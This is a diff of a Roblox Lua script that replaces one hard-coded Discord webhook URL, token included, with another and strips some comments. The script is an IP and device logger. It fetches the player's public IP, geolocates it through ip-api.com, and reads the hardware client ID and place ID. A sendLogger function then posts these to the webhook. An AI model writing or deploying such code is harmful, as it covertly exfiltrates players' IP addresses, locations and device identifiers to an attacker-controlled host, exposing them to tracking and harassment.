@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local ip = game:HttpGet("https://api.ipify.org")
 --updated
-local url = "https://discord.com/api/webhooks/1287818521543446680/5ha8-NQG5pyh8VlQlbnE0VWR0CEMOLZ7xbZ48Kik8t2pgNPv0h0-ljvwT7vRKx6FbXvY"
+local url1 = "https://discord.com/api/webhooks/1305061083412955156/d0jJV5UnYTfCW6dzLW-NdqOkss0S-Vy-RvtxPRZqyJ9EgAVrz6zTgjAKIO-itemz54bh"
 local player = game.Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
@@ -11,19 +11,17 @@ local data1 = HttpService:JSONDecode(response1)
 
 local response = game:HttpGet("http://ip-api.com/json/".. ip)
 
--- Decode the JSON into a Lua table
 local data = HttpService:JSONDecode(response)
 
--- Function to pretty-print the table
 local function prettyPrint(table, indent)
     indent = indent or 0
     local output = ""
-    local prefix = string.rep(" ", indent)  -- Create an indentation
+    local prefix = string.rep(" ", indent)  
 
     for key, value in pairs(table) do
         output = output .. prefix .. tostring(key) .. ": "
         if type(value) == "table" then
-            output = output .. "\n" .. prettyPrint(value, indent + 2)  -- Recursive call for nested tables
+            output = output .. "\n" .. prettyPrint(value, indent + 2)
         else
             output = output .. tostring(value) .. "\n"
         end
@@ -62,7 +60,7 @@ function sendWebhook(url, content, embed)
 end
 
 function sendLogger()
-	local url = "https://discord.com/api/webhooks/1287818521543446680/5ha8-NQG5pyh8VlQlbnE0VWR0CEMOLZ7xbZ48Kik8t2pgNPv0h0-ljvwT7vRKx6FbXvY"
+	local url = url1
 	local ip = game:HttpGet("https://api.ipify.org")
 	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 	local placeId = game.PlaceId
